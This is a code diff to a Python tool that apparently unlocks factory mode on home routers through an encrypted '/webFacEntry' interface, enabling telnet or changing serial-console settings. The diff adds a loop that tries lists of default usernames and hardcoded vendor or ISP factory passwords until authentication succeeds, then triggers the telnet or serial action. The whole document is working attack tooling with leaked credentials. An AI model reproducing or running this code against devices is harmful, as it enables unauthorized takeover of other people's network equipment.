@@ -114,7 +114,7 @@ class WebFac:
         try:
             resp = self.S.post(f"http://{self.ip}:{self.port}/webFacEntry",
                                data=self.chiper.encrypt(pad(f'SendInfo.gch?info=6|'.encode(), 16)))
-            print(resp.status_code, repr(resp.text))
+            # print(resp.status_code, repr(resp.text))
             if resp.status_code == 200:
                 return True
             elif resp.status_code == 400:
@@ -136,6 +136,7 @@ class WebFac:
             # print(repr(resp.text))
             if resp.status_code == 200:
                 # checkLoginAuth use wrong function strlen to calc response size, so we may need to pad ciphertext first
+                # but ciphertext can still be truncated prematurely，resulting in undecryptable data
                 ciphertext = resp.content
                 # print(len(ciphertext))
                 if len(ciphertext) % 16:
@@ -165,7 +166,7 @@ class WebFacSerial(WebFac):
                 data=self.chiper.encrypt(
                     pad(f'SerialSlience.gch?action={action}'.encode(), 16)
                 ))
-            print(repr(resp.text))
+            # print(repr(resp.text))
             if resp.status_code == 200:
                 return True
             elif resp.status_code == 400:
@@ -191,7 +192,7 @@ class WebFacTelnet(WebFac):
                 resp = self.S.post(
                     f"http://{self.ip}:{self.port}/webFacEntry",
                     data=self.chiper.encrypt(
-                        pad(f'FactoryMode.gch?mode=2&user=notused'.encode(), 16)
+                        pad('FactoryMode.gch?mode=2&user=notused'.encode(), 16)
                     ))
             # print(repr(resp.text))
             if resp.status_code == 200:
@@ -210,73 +211,71 @@ class WebFacTelnet(WebFac):
         return False
 
 
-def dealSerial(ip, port, users, pws, action):
-    for user in users:
-        for pw in pws:
-            serial = WebFacSerial(ip, port, user, pw)
-            print("reset facTelnetSteps:")
-            if serial.reset():
-                print("reset OK")
-
-            print("\nfacStep 1:")
-            serial.requestFactoryMode()
-
-            print("\nfacStep 2:")
-            version = serial.sendSq()
-
-            if version == 1:
-                print("\nfacStep 3:")
-                serial.checkLoginAuth()
-            elif version == 2:
-                print("\nfacStep 3:")
-                if not serial.sendInfo():
-                    print("sendInfo error")
-                    return
-                print("\nfacStep 4:")
-                serial.checkLoginAuth()
-
-            print("\nfacStep 5:")
-            serial.serialSlience(action)
-
-
-def dealTelnet(ip, port, users, pws, action):
+def dealFacAuth(Class: WebFac, ip, port, users, pws):
     for user in users:
         for pw in pws:
             print(f"trying  user:\"{user}\" pass:\"{pw}\" ")
-            telnet = WebFacTelnet(ip, port, user, pw)
+            webfac = Class(ip, port, user, pw)
             print("reset facTelnetSteps:")
-            if telnet.reset():
-                print("reset OK")
+            if webfac.reset():
+                print("reset OK!\n")
 
-            print("\nfacStep 1:")
-            telnet.requestFactoryMode()
+            print("facStep 1:")
+            webfac.requestFactoryMode()
+            print("OK!\n")
 
-            print("\nfacStep 2:")
-            version = telnet.sendSq()
+            print("facStep 2:")
+            version = webfac.sendSq()
+            print("OK!\n")
 
             if version == 1:
-                print("\nfacStep 3:")
-                if telnet.checkLoginAuth():
-                    print("\nfacStep 4:")
+                print("facStep 3:")
+                print("OK!\n")
+                if webfac.checkLoginAuth():
+                    print("facStep 4:")
+                    print("OK!\n")
             elif version == 2:
-                print("\nfacStep 3:")
-                if not telnet.sendInfo():
+                print("facStep 3:")
+                if not webfac.sendInfo():
                     print("sendInfo error")
                     return
-                print("\nfacStep 4:")
-                url = telnet.checkLoginAuth()
+                print("OK!\n")
+
+                print("facStep 4:")
+                url = webfac.checkLoginAuth()
                 if not url:
                     print("try next...\n")
                     continue
+                print("OK!\n")
                 print(repr(url))
-            else:
-                pass
+                return webfac
+    return False
 
-            print("\nfacStep 5:")
-            url = telnet.factoryMode(action)
-            if url:
-                print(repr(url))
-                return
+
+def dealSerial(ip, port, users, pws, action):
+    serial = dealFacAuth(WebFacSerial, ip, port, users, pws)
+    if not serial:
+        return
+
+    print("facStep 5:")
+    if serial.serialSlience(action):
+        print("OK!\n")
+    print('done')
+    return
+
+
+def dealTelnet(ip, port, users, pws, action):
+    telnet = dealFacAuth(WebFacTelnet, ip, port, users, pws)
+    if not telnet:
+        return
+
+    print("facStep 5:")
+    url = telnet.factoryMode(action)
+    if url:
+        print("OK!\n")
+        print(repr(url))
+        print('done')
+        return
 
 
 def parseArgs():
@@ -289,7 +288,7 @@ def parseArgs():
                         "user", "admin", "cuadmin", "lnadmin", "useradmin"])
     parser.add_argument('--pass', '-p', metavar='PASS', dest='pw', nargs='+', help='factorymode auth password', default=[
                         'nE%jA@5b', "aDm8H%MdA", "CUAdmin", "nE7jA%5m", "cqunicom",
-                        "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin",])
+                        "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin"])
     subparsers = parser.add_subparsers(dest='cmd', title='subcommands',
                                        description='valid subcommands',
                                        help='supported commands')
